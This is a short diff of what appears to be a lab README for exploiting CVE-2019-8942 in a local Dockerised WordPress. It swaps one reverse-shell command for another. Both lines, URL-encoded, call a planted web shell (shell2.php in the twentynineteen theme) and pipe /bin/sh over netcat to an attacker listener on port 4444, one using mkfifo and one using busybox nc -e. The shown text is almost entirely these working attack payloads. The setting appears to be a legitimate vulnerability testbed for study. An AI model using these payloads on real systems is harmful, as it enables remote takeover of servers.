@@ -74,7 +74,7 @@ Browse to [http://192.168.4.36:18180/wp-admin](http://192.168.4.36:18180/wp-admi
 > If accessing from another machine, set `WP_URL=http://<host-ip>:18180` in `.env` before first boot or `docker compose down -v && docker compose up -d` after changing.
 
 #### Method 2: Manual with polyglot
-Browser: http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell2.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.4.36%204444%20%3E%2Ftmp%2Ff
+Browser: http://192.168.4.36:18180/wp-content/themes/twentynineteen/shell2.php?cmd=busybox%20nc%20192.168.4.36%204444%20-e%20%2Fbin%2Fsh
 ```bash
 cd ~/wp-cve-all/exploits/cve-2019-8942
 # Use provided polyglot
